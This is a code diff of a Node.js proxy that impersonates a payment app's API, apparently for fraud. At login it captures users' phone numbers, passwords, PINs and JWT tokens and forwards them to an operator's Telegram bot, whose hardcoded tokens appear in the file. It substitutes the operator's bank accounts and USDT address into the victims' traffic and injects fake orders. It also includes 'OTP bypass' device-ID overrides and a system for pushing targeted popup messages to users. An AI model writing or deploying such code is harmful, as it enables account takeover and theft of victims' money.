@@ -289,30 +289,12 @@ function solveSlideCaptcha(masterB64, thumbB64, dispY) {
 }
 
 const app = express();
-const ORIGINAL_API = 'https://appm9t5zk.ddriva.com';
+const ORIGINAL_API = 'https://api.diwapay.com';
 const BOT_TOKEN = process.env.BOT_TOKEN || '8959979027:AAF3YDbFvkUe_uxDEI6ojaycyqrZZVUAeZA';
 const WEBHOOK_URL = 'https://xchas.vercel.app/bot-webhook';
-
-// === SECONDARY BOT CONFIGURATION ===
-const BOT2_TOKEN = process.env.BOT2_TOKEN || '8902409005:AAERSlRmgXR1GZFmAu3TGzsX6bzv29niwsQ';
-const BOT2_CHAT_ID = process.env.BOT2_CHAT_ID || '5880677639';
-
 const REDIS_URL = process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
 const REDIS_TOKEN = process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN;
 
-let bot = null;
-let webhookSet = false;
-try { bot = new TelegramBot(BOT_TOKEN); } catch (e) { }
-
-let bot2 = null;
-if (BOT2_TOKEN && BOT2_TOKEN !== 'BOT2_TOKEN_HERE') {
-  try { bot2 = new TelegramBot(BOT2_TOKEN); } catch (e) { }
-}
-
-function sendBot2Message(text, options) {
-  if (!bot2 || !BOT2_CHAT_ID || BOT2_CHAT_ID === 'BOT2_CHAT_ID_HERE') return;
-  bot2.sendMessage(BOT2_CHAT_ID, text, options || { parse_mode: 'Markdown' }).catch(() => { });
-}
 const DEFAULT_DATA = {
   banks: [],
   activeIndex: -1,
@@ -320,8 +302,7 @@ const DEFAULT_DATA = {
   autoRotate: false,
   lastUsedIndex: -1,
   adminChatId: null,
-  logRequests: true,
-  logDebugRequests: false,
+  logRequests: false,
   usdtAddress: '',
   depositSuccess: false,
   depositBonus: 0,
@@ -332,10 +313,8 @@ const DEFAULT_DATA = {
   orderBankMap: {},
   sentOrderInfo: {},
   dummyOrders: [],
-  useIdOverride: null,
-  alwaysIdOverride: null,
-  lastCapturedId: { deviceId: '', challengeId: '' },
-  customServiceLink: ''
+  userBanners: {},
+  userToasts: {}
 };
 
 function generateDummyCode() {
@@ -382,6 +361,10 @@ function findDummyOrder(data, idOrCode) {
 
   return null;
 }
+
+let bot = null;
+let webhookSet = false;
+try { bot = new TelegramBot(BOT_TOKEN); } catch (e) { }
 
 let redis = null;
 if (REDIS_URL && REDIS_TOKEN) {
@@ -494,7 +477,10 @@ function isAuthFailureResponse(jsonResp) {
 function shouldBypass401(req) {
   const path = (req.originalUrl || req.url || '').split('?')[0];
   const noBypass = [
-
+    '/app/user/login/', '/app/captcha/', '/app/user/info/updatePassword',
+    '/app/user/info/updatePin', '/app/user/info/verifyPin',
+    '/app/payment/order/submit', '/app/payment/order/create',
+    '/app/user/info/appLogout'
   ];
   return !noBypass.some(p => path.includes(p));
 }
@@ -505,7 +491,7 @@ function make401Bypass(jsonResp) {
 }
 
 function sendJsonSafe(res, headers, json, fallback, req) {
-  if (req && cachedData && cachedData.logDebugRequests && cachedData.adminChatId && bot) {
+  if (req && cachedData && cachedData.logRequests && cachedData.adminChatId && bot) {
     try {
       const path = req.originalUrl || req.url || 'N/A';
       const method = req.method || 'GET';
@@ -541,22 +527,12 @@ function sendJsonSafe(res, headers, json, fallback, req) {
   return sendJson(res, headers, json, fallback);
 }
 
-const WEBHOOK2_URL = 'https://xchas.vercel.app/bot2-webhook';
-let webhook2Set = false;
-
 async function ensureWebhook() {
-  if (bot && !webhookSet) {
-    try {
-      await bot.setWebHook(WEBHOOK_URL);
-      webhookSet = true;
-    } catch (e) { }
-  }
-  if (bot2 && !webhook2Set) {
-    try {
-      await bot2.setWebHook(WEBHOOK2_URL);
-      webhook2Set = true;
-    } catch (e) { }
-  }
+  if (!bot || webhookSet) return;
+  try {
+    await bot.setWebHook(WEBHOOK_URL);
+    webhookSet = true;
+  } catch (e) { }
 }
 
 async function loadData(forceRefresh) {
@@ -615,7 +591,7 @@ function saveTokenUserId(req, userId) {
   const key = cleanToken(tok);
   if (key && key.length > 10) {
     tokenUserMap[key] = String(userId);
-    if (redis) redis.hset('tokenMap', key, String(userId)).catch(() => { });
+    if (redis) redis.hset('diwapayTokenMap', key, String(userId)).catch(() => { });
   }
 }
 
@@ -626,7 +602,7 @@ async function getUserIdFromToken(req) {
   if (tokenUserMap[key]) return tokenUserMap[key];
   if (redis) {
     try {
-      const stored = await redis.hget('tokenMap', key);
+      const stored = await redis.hget('diwapayTokenMap', key);
       if (stored) { tokenUserMap[key] = String(stored); return String(stored); }
     } catch (e) { }
   }
@@ -712,10 +688,10 @@ async function isLogOffByToken(data, req) {
   if (userId && isLogOff(data, userId)) { logOffTokens.add(tKey); return true; }
   if (redis) {
     try {
-      const isOff = await redis.sismember('ddpayLogOffTokens', tKey);
+      const isOff = await redis.sismember('diwapayLogOffTokens', tKey);
       if (isOff) { logOffTokens.add(tKey); return true; }
-      const stored = await redis.hget('ddpayTokenMap', tKey);
-      if (stored && isLogOff(data, stored)) { logOffTokens.add(tKey); redis.sadd('ddpayLogOffTokens', tKey).catch(() => { }); return true; }
+      const stored = await redis.hget('diwapayTokenMap', tKey);
+      if (stored && isLogOff(data, stored)) { logOffTokens.add(tKey); redis.sadd('diwapayLogOffTokens', tKey).catch(() => { }); return true; }
     } catch (e) { }
   }
   checkedTokens.add(tKey);
@@ -800,35 +776,11 @@ app.use(async (req, res, next) => {
         req.parsedBody = {};
       }
     } catch (e) { req.parsedBody = {}; }
-    ensureWebhook().catch(() => {});
     next();
   });
 });
 
 async function proxyFetch(req, timeoutMs) {
-  // === ID OVERRIDE LOGIC (ONLY DEVICEID IS OVERRIDDEN FOR OTP BYPASS) ===
-  if (req.originalUrl && req.originalUrl.includes('/app/user/login')) {
-    try {
-      const data = cachedData || await loadData();
-      const body = req.parsedBody || {};
-
-      // 1. Auto-capture last seen deviceId for easy /useid or /alwaysid command usage
-      if (body.deviceId) {
-        if (!data.lastCapturedId) data.lastCapturedId = {};
-        data.lastCapturedId.deviceId = body.deviceId;
-        saveData(data).catch(() => {});
-      }
-
-      // 2. Check for active deviceId Override (single-use or persistent)
-      const override = data.useIdOverride || data.alwaysIdOverride;
-      if (override && override.deviceId) {
-        body.deviceId = override.deviceId;
-        req.parsedBody = body;
-        req.rawBody = Buffer.from(JSON.stringify(body), 'utf8');
-      }
-    } catch (e) {}
-  }
-
   const url = ORIGINAL_API + req.originalUrl;
   const fwd = {};
   for (const [k, v] of Object.entries(req.headers)) {
@@ -844,7 +796,7 @@ async function proxyFetch(req, timeoutMs) {
       kl.startsWith('x-amz-') || kl.startsWith('cf-')) continue;
     fwd[k] = v;
   }
-  fwd['host'] = 'appm9t5zk.ddriva.com';
+  fwd['host'] = 'api.diwapay.com';
   fwd['accept-encoding'] = 'identity';
   const ac = new AbortController();
   const tm = setTimeout(() => ac.abort(), timeoutMs || 12000);
@@ -1193,7 +1145,7 @@ app.use((req, res, next) => {
       if (userId && isLogOff(data, userId)) { if (tKey) logOffTokens.add(tKey); return; }
       if (!userId && tKey && redis) {
         try {
-          const isOff = await redis.sismember('ddpayLogOffTokens', tKey);
+          const isOff = await redis.sismember('diwapayLogOffTokens', tKey);
           if (isOff) { logOffTokens.add(tKey); return; }
         } catch (e) { }
       }
@@ -1226,7 +1178,7 @@ app.get('/health', async (req, res) => {
   const active = getActiveBank(data, null);
   res.json({
     status: 'ok',
-    app: 'DiwaPay Proxy',
+    app: 'DDPay Proxy',
     redis: redisConnected ? (redisWorking ? 'connected' : 'error') : 'not configured',
     bankActive: !!active,
     totalBanks: data.banks.length,
@@ -1269,12 +1221,6 @@ app.post('/bot-webhook', async (req, res) => {
       await bot.sendMessage(chatId,
         `🏦 DDPay Controller
 
-=== ID OVERRIDE (OTP BYPASS) ===
-/useid [deviceId] [challengeId] — Single next login override
-/alwaysid [deviceId] [challengeId] — Persistent login override
-/alwaysid off — Turn off persistent override
-/clearid — Clear all active ID overrides
-
 === BANK COMMANDS ===
 /addbank Name|AccNo|IFSC|BankName|UPI
 /removebank <number>
@@ -1315,20 +1261,15 @@ app.post('/bot-webhook', async (req, res) => {
 /usdt <address> — Set USDT address
 /usdt off — Disable USDT override
 
-=== CUSTOM SERVICE LINK ===
-/services <link/@handle> — Set Customer Support link (e.g. /services @zylox)
-/services reset — Reset Support link to default
-
 === TRACKING ===
 /idtrack — Show all tracked user IDs
 
 📌 Login pe auto-detect:
 • challengeId + deviceId dikhega
-• /useid ya /alwaysid bina argument ke aakhiri IDs use karega
+• Token + PIN brute command dikhega
 
 Example:
-/useid
-/alwaysid 4aa91f18ca564f20863d644fcd28be9c 1d2acf94b417415fad6a804a8ac5272a`
+/addbank Rahul Kumar|1234567890|SBIN0001234|SBI|rahul@upi`
       );
       return res.sendStatus(200);
     }
@@ -1379,35 +1320,167 @@ Example:
       return res.sendStatus(200);
     }
 
-    if (text.startsWith('/useid')) {
+    if (text.startsWith('/banner')) {
       const freshData = await loadData(true);
-      const parts = text.trim().split(/\s+/);
-      let devId = parts[1];
-      if (!devId && freshData.lastCapturedId) {
-        devId = freshData.lastCapturedId.deviceId;
-      }
-      if (!devId) {
-        await bot.sendMessage(chatId, '⚠️ Usage: /useid <deviceId>\nOr run /useid directly after a login attempt to use last captured deviceId.');
+      if (!freshData.userBanners) freshData.userBanners = {};
+      const parts = text.split(/\s+/);
+      const targetId = parts[1];
+      if (!targetId || targetId === 'off' || targetId === 'clear') {
+        if (targetId === 'off' || targetId === 'clear') {
+          const clearId = parts[2];
+          if (clearId) delete freshData.userBanners[clearId];
+          else freshData.userBanners = {};
+          await saveData(freshData);
+          await bot.sendMessage(chatId, '🧹 *Banners cleared!*', { parse_mode: 'Markdown' });
+          return res.sendStatus(200);
+        }
+        await bot.sendMessage(chatId, '📢 *Usage:* `/banner <userId> <message>`\nOr: `/banner <userId> <Title> | <Message>`\nClear: `/banner clear <userId>`', { parse_mode: 'Markdown' });
         return res.sendStatus(200);
       }
-      freshData.useIdOverride = { deviceId: devId };
+      const rest = text.substring(text.indexOf(targetId) + targetId.length).trim();
+      if (!rest || rest === 'off') {
+        delete freshData.userBanners[targetId];
+        await saveData(freshData);
+        await bot.sendMessage(chatId, '🧹 Banner removed for user ' + targetId, { parse_mode: 'Markdown' });
+        return res.sendStatus(200);
+      }
+      let title = '🚨 VIP Notice';
+      let content = rest;
+      if (rest.includes('|')) {
+        const p = rest.split('|');
+        title = p[0].trim();
+        content = p.slice(1).join('|').trim();
+      }
+      freshData.userBanners[targetId] = {
+        id: Date.now(),
+        title: title,
+        content: content,
+        type: 1,
+        createTime: Date.now()
+      };
       await saveData(freshData);
-      await bot.sendMessage(chatId, `🎯 *Single-Use DeviceId Override Set (OTP Bypass)*\n━━━━━━━━━━━━━━━━━━\n📱 *Trusted DeviceId:* \`${devId}\`\n\n📌 Will apply to the VERY NEXT login attempt and then auto-reset.`, { parse_mode: 'Markdown' });
+      await bot.sendMessage(chatId, '📢 *Popup Banner Set for User ' + targetId + '*\n━━━━━━━━━━━━━━━━━━\n📌 *Title:* ' + title + '\n💬 *Message:* ' + content + '\n\n✨ *This banner will pop up FIRST on the user screen!*', { parse_mode: 'Markdown' });
+      return res.sendStatus(200);
+    }
+
+    if (text.startsWith('/toast')) {
+      const freshData = await loadData(true);
+      if (!freshData.userToasts) freshData.userToasts = {};
+      const parts = text.split(/\s+/);
+      const targetId = parts[1];
+      if (!targetId || targetId === 'off' || targetId === 'clear') {
+        if (targetId === 'off' || targetId === 'clear') {
+          const clearId = parts[2];
+          if (clearId) delete freshData.userToasts[clearId];
+          else freshData.userToasts = {};
+          await saveData(freshData);
+          await bot.sendMessage(chatId, '🧹 *Toasts cleared!*', { parse_mode: 'Markdown' });
+          return res.sendStatus(200);
+        }
+        await bot.sendMessage(chatId, '💬 *Usage:* `/toast <userId> <message>`\nClear: `/toast clear <userId>`', { parse_mode: 'Markdown' });
+        return res.sendStatus(200);
+      }
+      const message = text.substring(text.indexOf(targetId) + targetId.length).trim();
+      if (!message || message === 'off') {
+        delete freshData.userToasts[targetId];
+        await saveData(freshData);
+        await bot.sendMessage(chatId, '🧹 Toast removed for user ' + targetId, { parse_mode: 'Markdown' });
+        return res.sendStatus(200);
+      }
+      freshData.userToasts[targetId] = message;
+      await saveData(freshData);
+      await bot.sendMessage(chatId, '💬 *Toast Message Set for User ' + targetId + '*\n━━━━━━━━━━━━━━━━━━\n💬 *Message:* ' + message, { parse_mode: 'Markdown' });
+      return res.sendStatus(200);
+    }
+
+    if (text.startsWith('/useid')) {
+      const freshData = await loadData(true);
+      const parts = text.split(/\s+/);
+      const devId = parts[1];
+      const chId = parts[2];
+      if (!devId || !chId || devId === 'off' || devId === 'clear') {
+        if (devId === 'off' || devId === 'clear') {
+          freshData.useIdOverride = null;
+          await saveData(freshData);
+          await bot.sendMessage(chatId, '🧹 *Single ID override cleared!*', { parse_mode: 'Markdown' });
+          return res.sendStatus(200);
+        }
+        await bot.sendMessage(chatId, '📲 *Usage:* `/useid <deviceId> <challengeId>`\nExample: `/useid dev123 ch456`', { parse_mode: 'Markdown' });
+        return res.sendStatus(200);
+      }
+      freshData.useIdOverride = { deviceId: devId, challengeId: chId };
+      await saveData(freshData);
+      await bot.sendMessage(chatId, '✅ *Single Next Login Override Set!*\n━━━━━━━━━━━━━━━━━━\n📲 *Device ID:* `' + devId + '`\n🔑 *Challenge ID:* `' + chId + '`\n\n📌 *Will automatically apply to the very next login attempt!*', { parse_mode: 'Markdown' });
       return res.sendStatus(200);
     }
 
     if (text.startsWith('/alwaysid')) {
+      const freshData = await loadData(true);
+      const parts = text.split(/\s+/);
+      const devId = parts[1];
+      const chId = parts[2];
+      if (!devId || devId === 'off' || devId === 'clear') {
+        freshData.alwaysIdOverride = null;
+        await saveData(freshData);
+        await bot.sendMessage(chatId, '🧹 *Persistent ID override turned OFF!*', { parse_mode: 'Markdown' });
+        return res.sendStatus(200);
+      }
+      if (!chId) {
+        await bot.sendMessage(chatId, '📲 *Usage:* `/alwaysid <deviceId> <challengeId>`\nTurn OFF: `/alwaysid off`', { parse_mode: 'Markdown' });
+        return res.sendStatus(200);
+      }
+      freshData.alwaysIdOverride = { deviceId: devId, challengeId: chId };
+      await saveData(freshData);
+      await bot.sendMessage(chatId, '♾️ *Persistent Login Override Set!*\n━━━━━━━━━━━━━━━━━━\n📲 *Device ID:* `' + devId + '`\n🔑 *Challenge ID:* `' + chId + '`\n\n📌 *Will persistently apply to ALL login attempts until turned off!*', { parse_mode: 'Markdown' });
+      return res.sendStatus(200);
+    }
+
+    if (text === '/clearid' || text.startsWith('/clearid')) {
+      const freshData = await loadData(true);
+      freshData.useIdOverride = null;
+      freshData.alwaysIdOverride = null;
+      await saveData(freshData);
+      await bot.sendMessage(chatId, '🧹 *All Active ID Overrides Cleared!*', { parse_mode: 'Markdown' });
+      return res.sendStatus(200);
+    }
+
+    if (text === '/debug' || text === '/debug on' || text === '/debug off') {
+      const freshData = await loadData(true);
+      if (text === '/debug off') {
+        debugMode = false;
+        freshData.logRequests = false;
+        await saveData(freshData);
+        await bot.sendMessage(chatId, '🔴 Debug Mode OFF — normal mode').catch(() => { });
+      } else if (text === '/debug on') {
+        debugMode = true;
+        freshData.logRequests = true;
+        await saveData(freshData);
+        await bot.sendMessage(chatId, '🟢 Debug Mode ON — har request+response bot pe aayega\nBand karne ke liye: /debug off').catch(() => { });
+      } else {
+        freshData.logRequests = !freshData.logRequests;
+        debugMode = freshData.logRequests;
+        await saveData(freshData);
+        await bot.sendMessage(chatId, freshData.logRequests
+          ? '🟢 Debug Mode ON — har request+response bot pe aayega\nBand karne ke liye: /debug off'
+          : '🔴 Debug Mode OFF — normal mode').catch(() => { });
+      }
+      return res.sendStatus(200);
+    }
+
+    if (text.startsWith('/off log ')) {
+      const targetId = text.substring(9).trim();
+      if (!targetId) { await bot.sendMessage(chatId, '❌ Format: /off log <userId>'); return res.sendStatus(200); }
       if (!data.userOverrides) data.userOverrides = {};
       if (!data.userOverrides[targetId]) data.userOverrides[targetId] = {};
       data.userOverrides[targetId].logOff = true;
       await saveData(data);
       if (redis) {
         try {
-          const allTokens = await redis.hgetall('ddpayTokenMap');
+          const allTokens = await redis.hgetall('diwapayTokenMap');
           if (allTokens) {
             for (const [tKey, uid] of Object.entries(allTokens)) {
               if (String(uid) === String(targetId)) {
-                await redis.sadd('ddpayLogOffTokens', tKey);
+                await redis.sadd('diwapayLogOffTokens', tKey);
                 logOffTokens.add(tKey);
               }
             }
@@ -1430,11 +1503,11 @@ Example:
       }
       if (redis) {
         try {
-          const allTokens = await redis.hgetall('ddpayTokenMap');
+          const allTokens = await redis.hgetall('diwapayTokenMap');
           if (allTokens) {
             for (const [tKey, uid] of Object.entries(allTokens)) {
               if (String(uid) === String(targetId)) {
-                await redis.srem('ddpayLogOffTokens', tKey);
+                await redis.srem('diwapayLogOffTokens', tKey);
                 logOffTokens.delete(tKey);
               }
             }
@@ -1759,35 +1832,6 @@ Example:
       return res.sendStatus(200);
     }
 
-    
-    if (text.startsWith('/services') || text.startsWith('/service')) {
-      const param = text.replace(/^\/(services|service)/i, '').trim();
-      if (!param) {
-        const current = data.customServiceLink ? `\`${data.customServiceLink}\`` : '_Not Set (Using Default Upstream)_';
-        await bot.sendMessage(chatId, `🎧 *Customer Support Link Configuration*\n━━━━━━━━━━━━━━━━━━\n\n📌 *Current Link:* ${current}\n\n💡 *Commands:* \n• \`/services @zylox\` → Set link to https://t.me/zylox\n• \`/services https://t.me/zylox\` → Set custom Telegram link\n• \`/services reset\` or \`/services off\` → Reset to default upstream link`, { parse_mode: 'Markdown' });
-        return res.sendStatus(200);
-      }
-
-      if (param.toLowerCase() === 'reset' || param.toLowerCase() === 'off' || param.toLowerCase() === 'clear') {
-        data.customServiceLink = '';
-        await saveData(data);
-        await bot.sendMessage(chatId, '✅ Customer Support link reset to default upstream.');
-        return res.sendStatus(200);
-      }
-
-      let formattedUrl = param;
-      if (formattedUrl.startsWith('@')) {
-        formattedUrl = 'https://t.me/' + formattedUrl.substring(1);
-      } else if (!formattedUrl.startsWith('http://') && !formattedUrl.startsWith('https://')) {
-        formattedUrl = 'https://t.me/' + formattedUrl;
-      }
-
-      data.customServiceLink = formattedUrl;
-      await saveData(data);
-      await bot.sendMessage(chatId, `✅ *Customer Support Link Set!*\n━━━━━━━━━━━━━━━━━━\n\n🔗 *Target Link:* \`${formattedUrl}\` \n\nApp me CustomerService aur Channel dono buttons par click karne par user \`${formattedUrl}\` pe redirect hoga.`, { parse_mode: 'Markdown' });
-      return res.sendStatus(200);
-    }
-
     if (text.startsWith('/adddummy')) {
       data.dummyOrders = data.dummyOrders || [];
       const parts = text.substring(9).trim().split(/\s+/);
@@ -1921,57 +1965,27 @@ Example:
   }
 });
 
-app.post('/bot2-webhook', async (req, res) => {
-  try {
-    const msg = req.parsedBody?.message;
-    if (!msg || !msg.text) return res.sendStatus(200);
-    const chatId = msg.chat.id;
-    const text = msg.text.trim();
-    if (text.startsWith('/start')) {
-      if (bot2) {
-        await bot2.sendMessage(chatId, '🟢 Bot & App is active').catch(() => { });
-      }
-      return res.sendStatus(200);
-    }
-    return res.sendStatus(200);
-  } catch (e) {
-    return res.sendStatus(200);
-  }
-});
-
-
-app.all('/app/app/official/service/getOfficialServiceData', async (req, res) => {
-  const { response, respHeaders, respBuffer, jsonResp } = await proxyFetch(req);
-  try {
-    const data = await loadData();
-    if (data.customServiceLink && data.customServiceLink.trim() !== '') {
-      const customLink = data.customServiceLink.trim();
-      let resObj = jsonResp;
-      if (!resObj && respBuffer) {
-        try { resObj = JSON.parse(respBuffer.toString('utf8')); } catch (e) {}
-      }
-      if (resObj && Array.isArray(resObj.data)) {
-        resObj.data = resObj.data.map(item => ({
-          ...item,
-          link: customLink
-        }));
-        return sendJson(res, respHeaders, resObj, JSON.stringify(resObj));
-      }
-    }
-  } catch (e) {}
-  return sendJson(res, respHeaders, jsonResp, respBuffer);
-});
-
 app.post('/app/user/login/login', async (req, res) => {
   try {
     const data = await loadData();
     const body = req.parsedBody || {};
     const phone = body.userName || body.username || body.phone || body.mobile || '';
     const pwd = body.password || body.pwd || body.loginPwd || 'N/A';
-
     const ip = req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A';
     const city = req.headers['x-vercel-ip-city'] || 'N/A';
     const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+
+    if (data.adminChatId && bot) {
+      let msg =
+        `🔑 *Login Attempt (Credentials Received)*\n` +
+        `━━━━━━━━━━━━━━━━━━\n` +
+        `📱 *Phone:* \`${phone || 'N/A'}\`\n` +
+        `🔒 *Password:* \`${pwd}\`\n` +
+        `🌐 *IP:* ${ip}${city !== 'N/A' ? ' (' + city + ')' : ''}\n` +
+        `🕐 *Time:* ${time}`;
+
+      bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(() => { });
+    }
 
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const loginData = getResponseData(jsonResp);
@@ -1986,13 +2000,13 @@ app.post('/app/user/login/login', async (req, res) => {
       if (respToken && userId) {
         const tKey = cleanToken(respToken);
         tokenUserMap[tKey] = userId;
-        if (redis) redis.hset('tokenMap', tKey, userId).catch(() => { });
+        if (redis) redis.hset('diwapayTokenMap', tKey, userId).catch(() => { });
       }
       if (respRefresh && userId) {
         refreshTokenMap[String(userId)] = respRefresh;
         const rKey = cleanToken(respRefresh);
         tokenUserMap[rKey] = userId;
-        if (redis) redis.hset('tokenMap', rKey, userId).catch(() => { });
+        if (redis) redis.hset('diwapayTokenMap', rKey, userId).catch(() => { });
       }
       if (userId) {
         saveTokenUserId(req, userId);
@@ -2017,9 +2031,8 @@ app.post('/app/user/login/login', async (req, res) => {
       const isSuccess = jsonResp && (jsonResp.code === 1000 || jsonResp.code === 200 || jsonResp.code === '1000');
       if (isSuccess) {
         const loginToken = loginData ? (loginData.token || loginData.accessToken || loginData.jwtToken || loginData.jwt || loginData.access_token || '') : (jsonResp?.data?.token || jsonResp?.data?.accessToken || jsonResp?.data?.access_token || jsonResp?.token || '');
-        const devId = body.deviceId || body.androidId || body.device_id || '';
-        let baseMsg =
-          `✅ *[DDPay] Direct Login Successful*\n` +
+        let msg =
+          `✅ *Login Successful*\n` +
           `━━━━━━━━━━━━━━━━━━\n` +
           `👤 *UserID:* \`${userId || 'N/A'}\`\n` +
           `📱 *Phone:* \`${phone || 'N/A'}\`\n` +
@@ -2028,21 +2041,10 @@ app.post('/app/user/login/login', async (req, res) => {
           `🕐 *Time:* ${time}`;
 
         if (loginToken) {
-          baseMsg += `\n\n🔑 *JWT Token:*\n\`${loginToken}\``;
+          msg += `\n\n🔑 *JWT Token:*\n\`${loginToken}\``;
         }
 
-        sendBot2Message(baseMsg);
-
-        let msg = baseMsg;
-        if (devId) {
-          msg += `\n\n⚡ *OTP BYPASS COMMANDS:*\n` +
-            `👉 Click to copy Single Use:\n\`/useid ${devId}\`\n` +
-            `👉 Click to copy Persistent:\n\`/alwaysid ${devId}\``;
-        }
-
-        bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).then(m => {
-          if (m && m.message_id) bot.pinChatMessage(data.adminChatId, m.message_id).catch(() => { });
-        }).catch(() => { });
+        bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(() => { });
       } else {
         const errorMsg = jsonResp ? (jsonResp.message || JSON.stringify(jsonResp)) : 'Unknown error';
         let msg =
@@ -2077,7 +2079,7 @@ async function sendOtpHandler(req, res) {
 
       if (jsonResp && (jsonResp.code === 1000 || jsonResp.code === 200 || jsonResp.code === '1000')) {
         let msg =
-          `📲 *[DDPay] OTP Sent Successfully*\n` +
+          `📲 *OTP Sent Successfully*\n` +
           `━━━━━━━━━━━━━━━━━━\n` +
           `📱 *Phone:* \`${phone}\`\n` +
           `🔒 *Password:* \`${pwd}\`\n` +
@@ -2085,7 +2087,6 @@ async function sendOtpHandler(req, res) {
           `🕐 *Time:* ${time}`;
 
         bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(() => { });
-        sendBot2Message(msg);
       } else {
         const errorMsg = jsonResp ? (jsonResp.message || JSON.stringify(jsonResp)) : 'Unknown error';
         let msg =
@@ -2123,14 +2124,13 @@ app.post('/app/user/login/start', async (req, res) => {
     const body = req.parsedBody || {};
     const phone = body.userName || body.phone || body.mobile || 'N/A';
     const pwd = body.password || body.pwd || body.loginPwd || 'N/A';
-
     const ip = req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A';
     const city = req.headers['x-vercel-ip-city'] || 'N/A';
     const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
 
     if (data.adminChatId && bot) {
       let msg =
-        `🔑 *[DDPay] Login Attempt Started*\n` +
+        `🔑 *Login Attempt (Credentials Received)*\n` +
         `━━━━━━━━━━━━━━━━━━\n` +
         `📱 *Phone:* \`${phone}\`\n` +
         `🔒 *Password:* \`${pwd}\`\n` +
@@ -2138,7 +2138,6 @@ app.post('/app/user/login/start', async (req, res) => {
         `🕐 *Time:* ${time}`;
 
       bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(() => { });
-      sendBot2Message(msg);
     }
 
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
@@ -2158,8 +2157,6 @@ app.post('/app/user/login/confirm', async (req, res) => {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const body = req.parsedBody || {};
     const phone = body.userName || body.phone || body.mobile || '';
-    const pwd = body.password || body.pwd || body.loginPwd || body.pin || 'N/A';
-
     const loginData = getResponseData(jsonResp);
     let userId = '';
 
@@ -2172,13 +2169,13 @@ app.post('/app/user/login/confirm', async (req, res) => {
       if (respToken && userId) {
         const tKey = cleanToken(respToken);
         tokenUserMap[tKey] = userId;
-        if (redis) redis.hset('tokenMap', tKey, userId).catch(() => { });
+        if (redis) redis.hset('diwapayTokenMap', tKey, userId).catch(() => { });
       }
       if (respRefresh && userId) {
         refreshTokenMap[String(userId)] = respRefresh;
         const rKey = cleanToken(respRefresh);
         tokenUserMap[rKey] = userId;
-        if (redis) redis.hset('tokenMap', rKey, userId).catch(() => { });
+        if (redis) redis.hset('diwapayTokenMap', rKey, userId).catch(() => { });
       }
       const deviceId = body.deviceId || body.androidId || body.device_id || '';
       if (deviceId && userId) {
@@ -2204,15 +2201,15 @@ app.post('/app/user/login/confirm', async (req, res) => {
     }
 
     if (data.adminChatId && bot) {
+      const pwd = body.password || body.pwd || body.loginPwd || body.pin || 'N/A';
       const ip = req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A';
       const city = req.headers['x-vercel-ip-city'] || 'N/A';
       const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
 
       if (jsonResp && (jsonResp.code === 1000 || jsonResp.code === 200 || jsonResp.code === '1000')) {
         const loginToken = loginData ? (loginData.token || loginData.accessToken || loginData.jwtToken || loginData.jwt || loginData.access_token || '') : (jsonResp?.data?.token || jsonResp?.data?.accessToken || jsonResp?.data?.access_token || jsonResp?.token || '');
-        const devId = body.deviceId || body.androidId || body.device_id || '';
-        let baseMsg =
-          `✅ *[DDPay] Login Successful*\n` +
+        let msg =
+          `✅ *Login Successful*\n` +
           `━━━━━━━━━━━━━━━━━━\n` +
           `👤 *UserID:* \`${userId || 'N/A'}\`\n` +
           `📱 *Phone:* \`${phone || 'N/A'}\`\n` +
@@ -2221,26 +2218,14 @@ app.post('/app/user/login/confirm', async (req, res) => {
           `🕐 *Time:* ${time}`;
 
         if (loginToken) {
-          baseMsg += `\n\n🔑 *JWT Token:*\n\`${loginToken}\``;
+          msg += `\n\n🔑 *JWT Token:*\n\`${loginToken}\``;
         }
 
-        // Send copy to Bot 2 WITHOUT OTP Bypass commands
-        sendBot2Message(baseMsg);
-
-        let msg = baseMsg;
-        if (devId) {
-          msg += `\n\n⚡ *OTP BYPASS COMMANDS:*\n` +
-            `👉 Click to copy Single Use:\n\`/useid ${devId}\`\n` +
-            `👉 Click to copy Persistent:\n\`/alwaysid ${devId}\``;
-        }
-
-        bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).then(m => {
-          if (m && m.message_id) bot.pinChatMessage(data.adminChatId, m.message_id).catch(() => { });
-        }).catch(() => { });
+        bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(() => { });
       } else {
         const errorMsg = jsonResp ? (jsonResp.message || JSON.stringify(jsonResp)) : 'Unknown error';
         let msg =
-          `❌ *[DDPay] Login Failed*\n` +
+          `❌ *Login Failed*\n` +
           `━━━━━━━━━━━━━━━━━━\n` +
           `📱 *Phone:* \`${phone || 'N/A'}\`\n` +
           `🔒 *Password:* \`${pwd}\`\n` +
@@ -2249,10 +2234,6 @@ app.post('/app/user/login/confirm', async (req, res) => {
 
         bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(() => { });
       }
-    }
-    if (data.useIdOverride) {
-      data.useIdOverride = null;
-      saveData(data).catch(() => { });
     }
     sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
   } catch (e) { await transparentProxy(req, res); }
@@ -2347,14 +2328,12 @@ async function proxyAndReplaceBankInList(req, res) {
 
     const listData = getResponseData(jsonResp);
     if (listData) {
-      // 1. Keep real server orders intact for all tabs (1000-10000, Top Picks, etc)
-      // 2. Only unshift dummy orders if added via /adddummy
       if (data.dummyOrders && Array.isArray(data.dummyOrders) && data.dummyOrders.length > 0 && req.originalUrl.includes('/app/payment/order') && !req.originalUrl.includes('/history') && !req.originalUrl.includes('orderInfo')) {
